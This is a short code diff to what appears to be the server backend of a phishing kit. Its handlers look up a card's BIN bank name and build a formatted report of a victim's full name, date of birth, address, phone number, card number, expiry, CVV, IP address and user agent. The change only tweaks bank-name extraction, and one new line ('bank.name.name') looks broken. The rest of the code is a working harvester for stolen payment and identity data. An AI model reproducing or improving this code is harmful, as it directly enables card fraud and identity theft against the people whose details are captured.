@@ -40,7 +40,7 @@ const sendRes = async (req, res) => {
   let bankName;
 
   if (response.data.bank) {
-    bankName = response.data.bank.name;
+    bankName = response.data.bank.name.name;
   }
 
   const binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
@@ -125,7 +125,7 @@ const sendAuRes = async (req, res) => {
   let bankName;
 
   if (response.data.bank) {
-    bankName = response.data.bank;
+    bankName = response.data.bank.name;
   }
   const binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
   var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}\nCity: ${town}\nState: ${state}\nZIP: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\nUser Agent: ${userAgent}\n+ ----------- BIN List Info ------------+\n${binList}`;
